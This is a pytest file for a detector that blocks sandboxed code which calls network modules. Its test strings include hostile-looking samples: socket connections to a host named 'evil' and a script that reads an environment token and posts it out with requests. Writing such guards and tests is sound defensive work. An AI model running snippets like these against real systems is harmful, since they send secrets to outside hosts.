"""Code network guard: block a sandboxed code argument naming a network caller.

Covers the BLOCK contract (the offending arg is named in the reason), the allow
path (arithmetic with no network primitive gets no opinion), each module the
pattern declares, non-string and non-dict input that must be skipped rather than
crashed on, and end-to-end verdicts through the engine.
"""
from typing import Any

from interlock import PolicyEngine, SensorEvent, Verdict
from interlock.detectors.code_network_guard import (
    PATTERN,
    POLICY_ID,
    code_network_guard,
)


def _event(**args):
    return SensorEvent(action="exec_code", args=args)


# --- the block path ---------------------------------------------------------


def test_socket_egress_is_blocked():
    decision = code_network_guard()(
        _event(code="import socket; socket.socket().connect(('evil',80))")
    )
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID


def test_block_reason_names_the_offending_argument():
    decision = code_network_guard()(
        _event(code="import socket; socket.socket().connect(('evil',80))")
    )
    assert decision is not None
    assert decision.reason == "code_network: code"


def test_reason_names_whichever_argument_matched():
    decision = code_network_guard()(
        _event(lang="python", snippet="requests.post(url, json=secret)")
    )
    assert decision is not None
    assert decision.reason == "code_network: snippet"


def test_first_matching_argument_wins():
    decision = code_network_guard()(
        _event(a="requests.get(url)", b="ftplib.FTP('evil')")
    )
    assert decision is not None
    assert decision.reason == "code_network: a"


def test_each_declared_module_is_blocked():
    payloads = (
        "import socket\nsocket.socket()",                   # socket.socket
        "from urllib.request import urlopen",               # urllib.request
        "requests.get('https://evil')",                     # requests.get
        "requests.post('https://evil', data=secret)",       # requests.post
        "import http.client",                               # http.client
        "import smtplib",                                   # smtplib
        "from ftplib import FTP",                           # ftplib
    )
    guard = code_network_guard()
    for payload in payloads:
        decision = guard(_event(code=payload))
        assert decision is not None, payload
        assert decision.verdict is Verdict.BLOCK, payload


def test_call_embedded_mid_script_is_caught():
    script = "tok = os.environ['T']\nimport requests\nrequests.post(u, data=tok)\n"
    decision = code_network_guard()(_event(code=script))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- the allow path ---------------------------------------------------------


def test_arithmetic_gets_no_opinion():
    assert code_network_guard()(_event(code="total = 2 + 2")) is None


def test_clean_multi_argument_call_gets_no_opinion():
    guard = code_network_guard()
    assert guard(_event(code="total = sum(values)", lang="python", timeout=5)) is None


def test_empty_args_get_no_opinion():
    assert code_network_guard()(SensorEvent(action="exec_code", args={})) is None


def test_a_similarly_named_identifier_does_not_match():
    # ``mysmtplib`` / ``socket_ish`` merely contain the module names as
    # substrings; the ``\b`` anchors must keep those out.
    guard = code_network_guard()
    assert guard(_event(code="import mysmtplib")) is None
    assert guard(_event(code="socket_ish = 1")) is None


# --- robustness: skip what it cannot handle, never raise --------------------


def test_non_str_values_are_skipped_without_crashing():
    guard = code_network_guard()
    assert guard(_event(code=None, retries=3)) is None
    assert guard(_event(options={"body": "requests.get(url)"})) is None
    assert guard(_event(argv=["requests.get(url)"])) is None


def test_non_dict_args_get_no_opinion():
    # Deliberately out-of-contract: a caller may hand the sensor anything, and
    # the guard must return no opinion rather than raise.
    none_args: Any = None
    str_args: Any = "requests.get(url)"
    assert (
        code_network_guard()(SensorEvent(action="exec_code", args=none_args)) is None
    )
    assert code_network_guard()(SensorEvent(action="exec_code", args=str_args)) is None


def test_a_non_str_sibling_does_not_mask_a_real_match():
    # The int must be skipped, not abort the scan before "code" is reached.
    decision = code_network_guard()(_event(retries=3, code="requests.get(url)"))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- constants --------------------------------------------------------------


def test_exposed_constants():
    assert POLICY_ID == "code_network"
    assert (
        PATTERN.search("import socket; socket.socket().connect(('evil',80))")
        is not None
    )
    assert PATTERN.search("total = 2 + 2") is None


# --- end to end through the engine ------------------------------------------


def test_engine_blocks_malicious_and_allows_benign():
    engine = PolicyEngine(rules=[code_network_guard()])

    malicious = SensorEvent(
        action="exec_code",
        args={"code": "import socket; socket.socket().connect(('evil',80))"},
    )
    decision = engine.evaluate(malicious)
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID

    benign = SensorEvent(action="exec_code", args={"code": "total = 2 + 2"})
    assert engine.evaluate(benign).verdict is Verdict.ALLOW
